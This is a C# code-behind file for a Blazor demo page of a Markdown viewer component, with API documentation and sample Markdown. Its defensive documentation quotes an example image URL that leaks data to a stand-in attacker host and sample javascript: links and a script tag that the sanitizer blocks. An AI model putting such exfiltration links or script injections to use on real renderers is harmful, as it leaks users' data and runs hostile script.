namespace Bit.BlazorUI.Demo.Client.Core.Pages.Components.Extras.MarkdownViewer;

public partial class BitMarkdownViewerDemo
{
    private enum MarkdownFlavor { Basic, GitHub, Advanced }

    private readonly List<ComponentParameter> componentParameters =
    [
        new()
        {
           Name = "Markdown",
           Type = "string?",
           DefaultValue = "null",
           Description = "The Markdown string value to render as html elements.",
        },
        new()
        {
           Name = "Pipeline",
           Type = "BitMarkdownPipeline?",
           DefaultValue = "null",
           Description = @"The processing pipeline (flavor set). Defaults to the basic CommonMark core with no extensions.
                           Use one of the ready-made pipelines on BitMarkdownPipelines (Basic, GitHub, Advanced)
                           or build a custom one with BitMarkdownPipelineBuilder.",
           LinkType = LinkType.Link,
           Href = "#markdown-viewer-pipeline",
        },
        new()
        {
           Name = "ImageRendering",
           Type = "BitMarkdownViewerImageRendering",
           DefaultValue = "BitMarkdownViewerImageRendering.SameOrigin",
           Description = @"Controls whether remote images are allowed to load, guarding against silent data-exfiltration
                           via auto-fetched image URLs (for example ![x](https://attacker.com/leak?data=SECRET)).
                           Defaults to the safe SameOrigin policy; set it to All to load every remote image when the
                           source is fully trusted, or None for the strictest policy.",
           LinkType = LinkType.Link,
           Href = "#markdown-viewer-image-rendering-enum",
        },
        new()
        {
           Name = "MaxNestingDepth",
           Type = "int",
           DefaultValue = "100",
           Description = @"The maximum block/inline nesting depth allowed while parsing. Content nested deeper than this is rendered
                           as plain text instead of being parsed further. An always-on safeguard against denial-of-service via
                           pathologically nested input (e.g. thousands of nested blockquotes) that would otherwise overflow the
                           stack. Values <= 0 fall back to the default. Legitimate documents never approach this limit.",
        },
        new()
        {
           Name = "MaxLength",
           Type = "int",
           DefaultValue = "0",
           Description = @"When greater than zero, the Markdown source is truncated to this many characters before parsing,
                           bounding the work done on untrusted input. The cut never splits a surrogate pair.
                           Defaults to 0 (no limit).",
        },
        new()
        {
           Name = "OnParsed",
           Type = "EventCallback<BitMarkdownDocumentNode>",
           DefaultValue = "",
           Description = @"Called after the Markdown source has been parsed, with the document that is about to be rendered.
                           The tree is the same one the renderer walks, so a handler can read it - to build a table of contents
                           from the headings, for example - or rewrite it before it reaches the DOM.",
           LinkType = LinkType.Link,
           Href = "#markdown-viewer-document-node",
        },
        new()
        {
           Name = "StripBidiControlCharacters",
           Type = "bool",
           DefaultValue = "false",
           Description = @"When true, Unicode bidirectional control characters are stripped from the source before parsing,
                           neutralizing 'Trojan Source' (CVE-2021-42574) spoofing where text is made to display in a different
                           order than it is encoded. Recommended for untrusted or AI-generated Markdown. Zero-width joiners used
                           by emoji and complex scripts are never removed.",
        },
    ];

    private readonly List<ComponentParameter> componentPublicMembers =
    [
        new()
        {
            Name = "Document",
            Type = "BitMarkdownDocumentNode",
            DefaultValue = "",
            Description = @"The most recently parsed document. Useful for reading structure out of the source
                            (headings, links, images) without parsing it a second time.",
            LinkType = LinkType.Link,
            Href = "#markdown-viewer-document-node",
        },
    ];

    private readonly List<ComponentSubClass> componentSubClasses =
    [
        new()
        {
            Id = "markdown-viewer-pipelines",
            Title = "BitMarkdownPipelines",
            Description = "The ready-made, cached pipelines. Each is built once and shared, so passing one costs nothing per render.",
            Parameters =
            [
                new()
                {
                    Name = "Basic",
                    Type = "static BitMarkdownPipeline",
                    DefaultValue = "",
                    Description = "The basic CommonMark core only: headings, emphasis, links, images, lists, block quotes, code, link reference definitions and character references.",
                },
                new()
                {
                    Name = "GitHub",
                    Type = "static BitMarkdownPipeline",
                    DefaultValue = "",
                    Description = "The GitHub flavors: pipe tables, strikethrough, task lists, autolink literals, footnotes and alerts, on top of the core.",
                },
                new()
                {
                    Name = "Advanced",
                    Type = "static BitMarkdownPipeline",
                    DefaultValue = "",
                    Description = "The GitHub flavors plus :shortcode: emoji and automatic heading ids.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-pipeline-builder",
            Title = "BitMarkdownPipelineBuilder",
            Description = "Composes a pipeline from the flavors you want. A freshly created builder holds only the CommonMark core; each Use... call adds one extension, and Build() produces the immutable pipeline. The same extension is only applied once.",
            Parameters =
            [
                new()
                {
                    Name = "UsePipeTables",
                    Type = "BitMarkdownPipelineBuilder UsePipeTables()",
                    DefaultValue = "",
                    Description = "Adds GitHub-style pipe tables with per-column alignment.",
                },
                new()
                {
                    Name = "UseStrikethrough",
                    Type = "BitMarkdownPipelineBuilder UseStrikethrough()",
                    DefaultValue = "",
                    Description = "Adds ~~strikethrough~~.",
                },
                new()
                {
                    Name = "UseTaskLists",
                    Type = "BitMarkdownPipelineBuilder UseTaskLists()",
                    DefaultValue = "",
                    Description = "Adds GitHub task lists (- [ ] / - [x]).",
                },
                new()
                {
                    Name = "UseAutoLinks",
                    Type = "BitMarkdownPipelineBuilder UseAutoLinks()",
                    DefaultValue = "",
                    Description = "Adds autolink literals, so bare URLs and email addresses become links.",
                },
                new()
                {
                    Name = "UseEmojis",
                    Type = "BitMarkdownPipelineBuilder UseEmojis(IReadOnlyDictionary<string, string>? overrides)",
                    DefaultValue = "",
                    Description = "Adds :shortcode: emoji replacement, optionally extending the built-in map with per-pipeline overrides.",
                },
                new()
                {
                    Name = "UseAutoIdentifiers",
                    Type = "BitMarkdownPipelineBuilder UseAutoIdentifiers()",
                    DefaultValue = "",
                    Description = "Gives every heading a unique, URL-friendly id slug so it can be deep-linked.",
                },
                new()
                {
                    Name = "UseFootnotes",
                    Type = "BitMarkdownPipelineBuilder UseFootnotes()",
                    DefaultValue = "",
                    Description = "Adds GitHub-style footnotes: a [^label] reference plus a [^label]: definition. Included in the GitHub bundle, because a footnote definition is also a valid link reference definition.",
                },
                new()
                {
                    Name = "UseAlerts",
                    Type = "BitMarkdownPipelineBuilder UseAlerts()",
                    DefaultValue = "",
                    Description = "Adds GitHub alerts: > [!NOTE], > [!TIP], > [!IMPORTANT], > [!WARNING] and > [!CAUTION] block quotes render as titled callouts.",
                },
                new()
                {
                    Name = "UseSoftLineAsHardLine",
                    Type = "BitMarkdownPipelineBuilder UseSoftLineAsHardLine()",
                    DefaultValue = "",
                    Description = "Renders every single newline as a line break, the way a chat or comment box does.",
                },
                new()
                {
                    Name = "UseGitHubFlavored",
                    Type = "BitMarkdownPipelineBuilder UseGitHubFlavored()",
                    DefaultValue = "",
                    Description = "Adds the full GitHub bundle: pipe tables, strikethrough, task lists, autolinks, footnotes and alerts.",
                },
                new()
                {
                    Name = "UseAdvanced",
                    Type = "BitMarkdownPipelineBuilder UseAdvanced()",
                    DefaultValue = "",
                    Description = "Adds the GitHub flavors plus emoji and auto-identifiers.",
                },
                new()
                {
                    Name = "Use",
                    Type = "BitMarkdownPipelineBuilder Use(IBitMarkdownExtension extension)",
                    DefaultValue = "",
                    Description = "Adds a custom extension. An extension registers block parsers, inline parsers, delimiter processors, AST processors and/or renderers; everything it registers must be stateless, since a built pipeline is shared across concurrent parses.",
                },
                new()
                {
                    Name = "Build",
                    Type = "BitMarkdownPipeline Build()",
                    DefaultValue = "",
                    Description = "Builds the immutable, reusable pipeline.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-pipeline",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-pipeline",
            Title = "BitMarkdownPipeline",
            Description = "An immutable, reusable Markdown processing configuration produced by a BitMarkdownPipelineBuilder. Pipelines are thread-safe and should be cached and shared rather than rebuilt per render.",
            Parameters =
            [
                new()
                {
                    Name = "Parse",
                    Type = "BitMarkdownDocumentNode Parse(string? markdown)",
                    DefaultValue = "",
                    Description = "Parses Markdown source into an AST, applying all AST processors.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-document-node",
                },
                new()
                {
                    Name = "CreateRenderer",
                    Type = "BitMarkdownRenderer CreateRenderer()",
                    DefaultValue = "",
                    Description = "Creates a renderer bound to this pipeline's node renderers.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-renderer",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-document-node",
            Title = "BitMarkdownDocumentNode",
            Description = "The root of a parsed Markdown document. Inherits from BitMarkdownNode.",
            Parameters =
            [
                new()
                {
                    Name = "Children",
                    Type = "List<BitMarkdownNode>",
                    DefaultValue = "[]",
                    Description = "The top-level child nodes of the document.",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-node",
                },
                new()
                {
                    Name = "ChildNodes",
                    Type = "IList<BitMarkdownNode>",
                    DefaultValue = "",
                    Description = "The node's single child collection (returns Children).",
                    LinkType = LinkType.Link,
                    Href = "#markdown-viewer-node",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-node",
            Title = "BitMarkdownNode",
            Description = "The abstract base type for every node produced by the parser. Nodes expose their mutable child collections so that AST processors (plugins) can traverse and rewrite the tree generically, even for node types they did not define. BitMarkdownAstHelper.Descendants(node) walks the whole tree iteratively, so even pathologically nested documents cannot overflow the stack.",
            Parameters =
            [
                new()
                {
                    Name = "ChildNodes",
                    Type = "virtual IList<BitMarkdownNode>?",
                    DefaultValue = "null",
                    Description = "The node's single child collection, if it has exactly one. Container nodes override this; leaf nodes return null.",
                },
                new()
                {
                    Name = "ChildLists",
                    Type = "virtual IEnumerable<IList<BitMarkdownNode>>",
                    DefaultValue = "",
                    Description = "All mutable child collections owned by this node. Defaults to the single ChildNodes collection; nodes with several (e.g. a table's cells) override this to expose each one.",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-renderer",
            Title = "BitMarkdownRenderer",
            Description = "Walks an AST and dispatches each node to a matching node renderer. Renderers are probed in reverse registration order, so the last renderer registered for a node type wins, allowing pipeline extensions to override the core renderers.",
            Parameters =
            [
                new()
                {
                    Name = "WriteNodes",
                    Type = "void WriteNodes(RenderTreeBuilder builder, IEnumerable<BitMarkdownNode> nodes)",
                    DefaultValue = "",
                    Description = "Renders a sequence of nodes.",
                },
                new()
                {
                    Name = "WriteNode",
                    Type = "void WriteNode(RenderTreeBuilder builder, BitMarkdownNode node)",
                    DefaultValue = "",
                    Description = "Renders a single node using the matching renderer (last registered wins).",
                },
            ]
        },
    ];

    private readonly List<ComponentSubEnum> componentSubEnums =
    [
        new()
        {
            Id = "markdown-viewer-image-rendering-enum",
            Name = "BitMarkdownViewerImageRendering",
            Description = "Controls how the BitMarkdownViewer handles image sources, primarily as a defense against data-exfiltration attacks. A remote image is fetched automatically by the browser the moment it is rendered, silently leaking whatever an attacker encodes into the URL.",
            Items =
            [
                new()
                {
                    Name = "All",
                    Description = "All images are rendered and loaded automatically, including remote ones. Suitable only when the Markdown source is fully trusted.",
                    Value = "0",
                },
                new()
                {
                    Name = "SameOrigin",
                    Description = "Only same-origin images (relative paths, anchors, same-document references and embedded data: images) are loaded. Cross-origin images (http:, https: and protocol-relative //) are blocked. The recommended mode for untrusted or AI-generated Markdown.",
                    Value = "1",
                },
                new()
                {
                    Name = "None",
                    Description = "No image is allowed to load; every image source is stripped and only the alt text remains. The strictest option.",
                    Value = "2",
                },
            ]
        },
        new()
        {
            Id = "markdown-viewer-alert-kind-enum",
            Name = "BitMarkdownAlertKind",
            Description = "The five GitHub alert kinds a > [!...] block quote can carry, in the order GitHub documents them.",
            Items =
            [
                new() { Name = "Note", Description = "Useful information the reader should notice even when skimming.", Value = "0" },
                new() { Name = "Tip", Description = "Optional advice for doing something better.", Value = "1" },
                new() { Name = "Important", Description = "Key information the reader needs to succeed.", Value = "2" },
                new() { Name = "Warning", Description = "Urgent information that needs immediate attention to avoid a problem.", Value = "3" },
                new() { Name = "Caution", Description = "Advice about the risks or negative outcomes of an action.", Value = "4" },
            ]
        },
    ];



    // -- GitHub flavored example ---------------------------------------------

    private readonly string gitHubMarkdown = @"# GitHub Flavored Markdown

Supports ~~strikethrough~~ and bare links like https://bitplatform.dev

## Task list

- [x] Parse Markdown in pure C#
- [x] Render the real render tree
- [ ] Use any JavaScript

## Table

| Feature       | Basic | GitHub |
|:--------------|:-----:|:------:|
| Headings      |   ✔   |   ✔    |
| Tables        |       |   ✔    |
| Strikethrough |       |   ✔    |
";



    // -- Alerts example ------------------------------------------------------

    private readonly string alertsMarkdown = @"> [!NOTE]
> Useful information that users should know, even when skimming content.

> [!TIP]
> Helpful advice for doing things better or more easily.

> [!IMPORTANT]
> Key information users need to know to achieve their goal.

> [!WARNING]
> Urgent info that needs immediate user attention to avoid problems.

> [!CAUTION]
> Advises about risks or negative outcomes of certain actions.

> A block quote without a marker is still an ordinary block quote.
";



    // -- Footnotes example ---------------------------------------------------

    private readonly string footnotesMarkdown = @"The parser walks the source once[^once] and hands the renderer an AST[^ast],
which is why the same note can be cited twice[^once].

[^once]: One pass over the lines, then one pass over the inline text of each block.
[^ast]: An abstract syntax tree - the tree of headings, paragraphs and inline runs
    that the render tree is built from.
";



    // -- References & entities example ---------------------------------------

    private readonly string referencesMarkdown = @"# Reference links

The [bit platform][bit] site, the [Blazor docs][docs], and the same
[bit] link again as a shortcut reference.

Character references are decoded too: &copy; 2026 &mdash; &#169; is the same
sign written as a number, and &#x2705; as hex. Inside code they stay literal:
`&copy;`.

[bit]: https://bitplatform.dev ""bit platform""
[docs]: https://learn.microsoft.com/aspnet/core/blazor ""ASP.NET Core Blazor""
";



    // -- Line breaks example -------------------------------------------------

    private readonly BitMarkdownPipeline softBreakPipeline = new BitMarkdownPipelineBuilder()
        .UseSoftLineAsHardLine()
        .Build();

    private readonly string lineBreaksMarkdown = @"Roses are red
Violets are blue
Markdown reflows
Unless you tell it not to";



    // -- Custom pipeline example ---------------------------------------------

    private readonly BitMarkdownPipeline customPipeline = new BitMarkdownPipelineBuilder()
        .UsePipeTables()
        .UseStrikethrough()
        .UseTaskLists()
        .UseEmojis()
        .UseAutoIdentifiers()
        .Build();

    private readonly string customMarkdown = @"# Custom pipeline :sparkles:

This viewer uses a pipeline composed with only the extensions we picked:
pipe tables, strikethrough, task lists, emoji and auto identifiers.
Autolinks were left out, so https://bitplatform.dev stays plain text.

- [x] ~~Old~~ approach replaced
- [ ] Anything left to do?
";



    // -- Untrusted content example -------------------------------------------

    private static readonly BitMarkdownViewerImageRendering[] imageRenderingModes =
    [
        BitMarkdownViewerImageRendering.SameOrigin,
        BitMarkdownViewerImageRendering.None,
        BitMarkdownViewerImageRendering.All
    ];

    private BitMarkdownViewerImageRendering imageRendering = BitMarkdownViewerImageRendering.SameOrigin;

    private readonly string untrustedMarkdown = @"### Content from somewhere else

A same-origin image always loads:

![the bit logo](/images/bit-logo-blue.png)

A cross-origin one only loads under `All`:

![a remote badge](https://img.shields.io/nuget/v/Bit.BlazorUI.Extras)

Unsafe URLs never survive the sanitizer, whatever the policy:
[a javascript link](javascript:alert(1)) and ![an unsafe image](javascript:alert(1)).

Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
";



    // -- Table of contents example -------------------------------------------

    private record TocEntry(int Level, string Id, string Text);

    private List<TocEntry> tocEntries = [];

    private void HandleParsed(BitMarkdownDocumentNode document)
    {
        tocEntries = BitMarkdownAstHelper.Descendants(document)
                                         .OfType<BitMarkdownHeadingNode>()
                                         .Where(h => string.IsNullOrEmpty(h.Id) is false)
                                         .Select(h => new TocEntry(h.Level, h.Id!, BitMarkdownInlineHelpers.PlainText(h.Inlines)))
                                         .ToList();
    }

    private readonly string tocMarkdown = @"# Release notes

## 9.4.0

### Added

Footnotes, alerts and reference links.

### Fixed

Truncation no longer splits a surrogate pair.

## 9.3.0

### Added

The whole native parser.
";



    // -- Playground example --------------------------------------------------

    private MarkdownFlavor playgroundFlavor = MarkdownFlavor.Advanced;
    private BitMarkdownPipeline playgroundPipeline = BitMarkdownPipelines.Advanced;
    private string playgroundMarkdown = SampleMarkdown;

    private void SetPlaygroundFlavor(MarkdownFlavor flavor)
    {
        playgroundFlavor = flavor;
        playgroundPipeline = flavor switch
        {
            MarkdownFlavor.Basic => BitMarkdownPipelines.Basic,
            MarkdownFlavor.GitHub => BitMarkdownPipelines.GitHub,
            _ => BitMarkdownPipelines.Advanced
        };
    }

    private void ResetPlaygroundSample() => playgroundMarkdown = SampleMarkdown;

    private string playgroundHint => playgroundFlavor switch
    {
        MarkdownFlavor.Basic => "Basic CommonMark only - reference links and character references still work, but tables, strikethrough, task lists, footnotes, alerts, emoji and bare URLs render as plain text.",
        MarkdownFlavor.GitHub => "The GitHub flavors: pipe tables, ~~strikethrough~~, task lists, autolink literals, footnotes and alerts.",
        _ => "Advanced: the GitHub flavors plus :sparkles: emoji and automatic heading ids."
    };

    private const string SampleMarkdown = """
        # BitMarkdownViewer

        A **native Blazor** Markdown viewer written in _pure C#_ - no JavaScript,
        no `innerHTML`, and ~~no external dependencies~~ zero external dependencies.

        ## Why it exists

        Most Blazor Markdown components wrap a JavaScript library and marshal strings
        across the interop boundary. This one parses Markdown into an AST and renders
        it straight to the Blazor render tree, so the output is **real DOM**.

        ### Feature highlights

        - Headings (ATX `#` and Setext)
        - **Bold**, *italic*, ***bold italic***, and ~~strikethrough~~
        - `inline code` and fenced code blocks
        - [Links](https://learn.microsoft.com/aspnet/core/blazor) and images
        - Ordered and unordered lists, including nesting:
            1. First item
            2. Second item
                - nested bullet
                - another one
            3. Third item
        - GitHub-style task lists:
            - [x] Parse blocks
            - [x] Parse inlines
            - [ ] Conquer the world

        ## Code

        Inline: `var viewer = new BitMarkdownViewer();`

        ```csharp
        public static BitMarkdownDocumentNode Parse(string? markdown)
        {
            var document = new BitMarkdownDocumentNode();
            if (string.IsNullOrEmpty(markdown))
                return document;
            return document;
        }
        ```

        ## Alerts

        > [!TIP]
        > Switch the Flavor above to Basic and watch this become an ordinary block quote.

        ## Blockquotes

        > "Any sufficiently advanced technology is indistinguishable from magic."
        >
        > - Arthur C. Clarke

        ## Tables

        | Feature        | Supported | Notes                  |
        | :------------- | :-------: | ---------------------: |
        | Headings       |    Yes    | Levels 1-6             |
        | Tables         |    Yes    | With column alignment  |
        | Task lists     |    Yes    | GitHub flavoured       |
        | Raw HTML       |    No     | Escaped for safety     |

        ## Links and notes

        Reference links keep the prose clean[^why]: see the [bit platform][bit] site.

        [bit]: https://bitplatform.dev "bit platform"
        [^why]: The destination is declared once, at the bottom, instead of interrupting
            the sentence.

        ## Safety

        Link and image URLs are sanitized, so `javascript:` URIs are stripped and raw
        HTML in the source is rendered as text rather than executed.

        ## Plugins (try the Flavor switch above)

        With the **Advanced** flavor you also get emoji and autolinks:

        - Emoji shortcodes: :rocket: :sparkles: :tada: :fire: :+1:
        - Bare URLs become links: https://learn.microsoft.com
        - Email autolinks: support@example.com
        - Character references: &copy; 2026 &mdash; decoded everywhere but in `code`

        Switch to **Basic** to see the same source rendered as plain CommonMark.

        ---

        Made with C# and the Blazor render tree.
        """;



    // -- RTL example ---------------------------------------------------------

    private readonly string rtlMarkdown = @"# نمایشگر مارک‌داون

متن **درشت** و *مورب* در کنار `کد درون‌خطی`.

> [!NOTE]
> نوار رنگی این کادر با جهت متن جابه‌جا می‌شود.

- مورد اول
- مورد دوم
    - مورد تودرتو

| ستون | مقدار |
|:-----|------:|
| یک   |     ۱ |
| دو   |     ۲ |
";



    private readonly string example1RazorCode = @"
<BitMarkdownViewer Markdown=""@(""# Native Markdown in Blazor\n\nRendered entirely in **C#** with no JavaScript and no third-party packages.\n\n- Real DOM output\n- Safe by default\n- Zero interop"")"" />";

    private readonly string example2RazorCode = @"
<BitMarkdownViewer Markdown=""@gitHubMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
    private readonly string example2CsharpCode = @"
private readonly string gitHubMarkdown = @""# GitHub Flavored Markdown

Supports ~~strikethrough~~ and bare links like https://bitplatform.dev

## Task list

- [x] Parse Markdown in pure C#
- [x] Render the real render tree
- [ ] Use any JavaScript

## Table

| Feature       | Basic | GitHub |
|:--------------|:-----:|:------:|
| Headings      |   ✔   |   ✔    |
| Tables        |       |   ✔    |
| Strikethrough |       |   ✔    |
"";";

    private readonly string example3RazorCode = @"
<BitMarkdownViewer Markdown=""@alertsMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
    private readonly string example3CsharpCode = @"
private readonly string alertsMarkdown = @""> [!NOTE]
> Useful information that users should know, even when skimming content.

> [!TIP]
> Helpful advice for doing things better or more easily.

> [!IMPORTANT]
> Key information users need to know to achieve their goal.

> [!WARNING]
> Urgent info that needs immediate user attention to avoid problems.

> [!CAUTION]
> Advises about risks or negative outcomes of certain actions.

> A block quote without a marker is still an ordinary block quote.
"";";

    private readonly string example4RazorCode = @"
<BitMarkdownViewer Markdown=""@footnotesMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
    private readonly string example4CsharpCode = @"
private readonly string footnotesMarkdown = @""The parser walks the source once[^once] and hands the renderer an AST[^ast],
which is why the same note can be cited twice[^once].

[^once]: One pass over the lines, then one pass over the inline text of each block.
[^ast]: An abstract syntax tree - the tree of headings, paragraphs and inline runs
    that the render tree is built from.
"";";

    private readonly string example5RazorCode = @"
<BitMarkdownViewer Markdown=""@referencesMarkdown"" />";
    private readonly string example5CsharpCode = @"
private readonly string referencesMarkdown = @""# Reference links

The [bit platform][bit] site, the [Blazor docs][docs], and the same
[bit] link again as a shortcut reference.

Character references are decoded too: &copy; 2026 &mdash; &#169; is the same
sign written as a number, and &#x2705; as hex. Inside code they stay literal:
`&copy;`.

[bit]: https://bitplatform.dev """"bit platform""""
[docs]: https://learn.microsoft.com/aspnet/core/blazor """"ASP.NET Core Blazor""""
"";";

    private readonly string example6RazorCode = @"
<div class=""mdv-columns"">
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">Default</div>
        <BitMarkdownViewer Markdown=""@lineBreaksMarkdown"" />
    </div>
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">UseSoftLineAsHardLine()</div>
        <BitMarkdownViewer Markdown=""@lineBreaksMarkdown"" Pipeline=""@softBreakPipeline"" />
    </div>
</div>";
    private readonly string example6CsharpCode = @"
private readonly BitMarkdownPipeline softBreakPipeline = new BitMarkdownPipelineBuilder()
    .UseSoftLineAsHardLine()
    .Build();

private readonly string lineBreaksMarkdown = @""Roses are red
Violets are blue
Markdown reflows
Unless you tell it not to"";";

    private readonly string example7RazorCode = @"
<BitMarkdownViewer Markdown=""@customMarkdown"" Pipeline=""customPipeline"" />";
    private readonly string example7CsharpCode = @"
private readonly BitMarkdownPipeline customPipeline = new BitMarkdownPipelineBuilder()
    .UsePipeTables()
    .UseStrikethrough()
    .UseTaskLists()
    .UseEmojis()
    .UseAutoIdentifiers()
    .Build();

private readonly string customMarkdown = @""# Custom pipeline :sparkles:

This viewer uses a pipeline composed with only the extensions we picked:
pipe tables, strikethrough, task lists, emoji and auto identifiers.
Autolinks were left out, so https://bitplatform.dev stays plain text.

- [x] ~~Old~~ approach replaced
- [ ] Anything left to do?
"";";

    private readonly string example8RazorCode = @"
<div class=""mdv-toolbar"">
    <span class=""mdv-label"">ImageRendering:</span>
    @foreach (var mode in imageRenderingModes)
    {
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(imageRendering == mode)""
                   Variant=""@(imageRendering == mode ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => imageRendering = mode)"">@mode</BitButton>
    }
</div>
<BitMarkdownViewer Markdown=""@untrustedMarkdown""
                   Pipeline=""BitMarkdownPipelines.GitHub""
                   ImageRendering=""@imageRendering""
                   StripBidiControlCharacters=""true""
                   MaxLength=""100000"" />";
    private readonly string example8CsharpCode = @"
private static readonly BitMarkdownViewerImageRendering[] imageRenderingModes =
[
    BitMarkdownViewerImageRendering.SameOrigin,
    BitMarkdownViewerImageRendering.None,
    BitMarkdownViewerImageRendering.All
];

private BitMarkdownViewerImageRendering imageRendering = BitMarkdownViewerImageRendering.SameOrigin;

private readonly string untrustedMarkdown = @""### Content from somewhere else

A same-origin image always loads:

![the bit logo](/images/bit-logo-blue.png)

A cross-origin one only loads under `All`:

![a remote badge](https://img.shields.io/nuget/v/Bit.BlazorUI.Extras)

Unsafe URLs never survive the sanitizer, whatever the policy:
[a javascript link](javascript:alert(1)) and ![an unsafe image](javascript:alert(1)).

Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
"";";

    private readonly string example9RazorCode = @"
<div class=""mdv-toc-layout"">
    <nav class=""mdv-toc"" aria-label=""On this page"">
        <div class=""mdv-toc-title"">On this page</div>
        @foreach (var entry in tocEntries)
        {
            <a class=""@($""mdv-toc-item mdv-toc-level-{entry.Level}"")"" href=""@($""#{entry.Id}"")"">@entry.Text</a>
        }
    </nav>
    <BitMarkdownViewer Markdown=""@tocMarkdown"" Pipeline=""BitMarkdownPipelines.Advanced"" OnParsed=""HandleParsed"" />
</div>";
    private readonly string example9CsharpCode = @"
private record TocEntry(int Level, string Id, string Text);

private List<TocEntry> tocEntries = [];

private void HandleParsed(BitMarkdownDocumentNode document)
{
    tocEntries = BitMarkdownAstHelper.Descendants(document)
                                     .OfType<BitMarkdownHeadingNode>()
                                     .Where(h => string.IsNullOrEmpty(h.Id) is false)
                                     .Select(h => new TocEntry(h.Level, h.Id!, BitMarkdownInlineHelpers.PlainText(h.Inlines)))
                                     .ToList();
}

private readonly string tocMarkdown = @""# Release notes

## 9.4.0

### Added

Footnotes, alerts and reference links.

### Fixed

Truncation no longer splits a surrogate pair.

## 9.3.0

### Added

The whole native parser.
"";";

    private readonly string example10RazorCode = @"
<div class=""mdv-playground"">
    <div class=""mdv-toolbar"">
        <span class=""mdv-label"">Flavor:</span>
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.Basic)""
                   Variant=""@(playgroundFlavor == MarkdownFlavor.Basic ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.Basic))"">Basic</BitButton>
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.GitHub)""
                   Variant=""@(playgroundFlavor == MarkdownFlavor.GitHub ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.GitHub))"">GitHub</BitButton>
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.Advanced)""
                   Variant=""@(playgroundFlavor == MarkdownFlavor.Advanced ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.Advanced))"">Advanced</BitButton>
        <span class=""mdv-spacer""></span>
        <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" OnClick=""ResetPlaygroundSample"">Reset sample</BitButton>
        <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" OnClick=""@(() => playgroundMarkdown = string.Empty)"">Clear</BitButton>
    </div>

    <div class=""mdv-hint"">@playgroundHint</div>

    <div class=""mdv-split"">
        <textarea class=""mdv-editor"" spellcheck=""false"" aria-label=""Markdown editor"" @bind=""playgroundMarkdown"" @bind:event=""oninput""></textarea>
        <div class=""mdv-preview"">
            <BitMarkdownViewer Markdown=""@playgroundMarkdown""
                               Pipeline=""@playgroundPipeline""
                               ImageRendering=""BitMarkdownViewerImageRendering.SameOrigin""
                               StripBidiControlCharacters=""true""
                               MaxLength=""100000"" />
        </div>
    </div>
</div>";
    private readonly string example10CsharpCode = @"
private enum MarkdownFlavor { Basic, GitHub, Advanced }

private MarkdownFlavor playgroundFlavor = MarkdownFlavor.Advanced;
private BitMarkdownPipeline playgroundPipeline = BitMarkdownPipelines.Advanced;
private string playgroundMarkdown = SampleMarkdown; // a feature-rich sample document

private void SetPlaygroundFlavor(MarkdownFlavor flavor)
{
    playgroundFlavor = flavor;
    playgroundPipeline = flavor switch
    {
        MarkdownFlavor.Basic => BitMarkdownPipelines.Basic,
        MarkdownFlavor.GitHub => BitMarkdownPipelines.GitHub,
        _ => BitMarkdownPipelines.Advanced
    };
}

private void ResetPlaygroundSample() => playgroundMarkdown = SampleMarkdown;

private string playgroundHint => playgroundFlavor switch
{
    MarkdownFlavor.Basic => ""Basic CommonMark only - reference links and character references still work, but tables, strikethrough, task lists, footnotes, alerts, emoji and bare URLs render as plain text."",
    MarkdownFlavor.GitHub => ""The GitHub flavors: pipe tables, ~~strikethrough~~, task lists, autolink literals, footnotes and alerts."",
    _ => ""Advanced: the GitHub flavors plus :sparkles: emoji and automatic heading ids.""
};";

    private readonly string example11RazorCode = @"
<BitMarkdownViewer Style=""border-inline-start:0.25rem solid var(--bit-clr-pri);padding-inline-start:1rem""
                   Markdown=""@(""A **styled** viewer, set apart with an inline `Style`."")"" />

<BitMarkdownViewer Class=""custom-mdv""
                   Markdown=""@(""### A classy viewer\n\nEvery `code` span and heading inside it is restyled from the page's own stylesheet."")"" />";
    private readonly string example11ScssCode = @"
.custom-mdv {
    padding: 1rem;
    border-radius: 0.5rem;
    background: $bit-color-background-secondary;

    h3 {
        margin-top: 0;
        color: $bit-color-primary;
    }

    code {
        color: $bit-color-primary-dark;
        background: $bit-color-background-primary-light;
    }
}";
    private readonly DemoCodeFile[] example11CodeFiles;

    private readonly string example12RazorCode = @"
<BitMarkdownViewer Dir=""BitDir.Rtl"" Markdown=""@rtlMarkdown"" Pipeline=""BitMarkdownPipelines.Advanced"" />";
    private readonly string example12CsharpCode = @"
private readonly string rtlMarkdown = @""# نمایشگر مارک‌داون

متن **درشت** و *مورب* در کنار `کد درون‌خطی`.

> [!NOTE]
> نوار رنگی این کادر با جهت متن جابه‌جا می‌شود.

- مورد اول
- مورد دوم
    - مورد تودرتو

| ستون | مقدار |
|:-----|------:|
| یک   |     ۱ |
| دو   |     ۲ |
"";";

    public BitMarkdownViewerDemo()
    {
        example11CodeFiles =
        [
            new("BitMarkdownViewerDemo.razor.scss", example11ScssCode),
        ];
    }
}
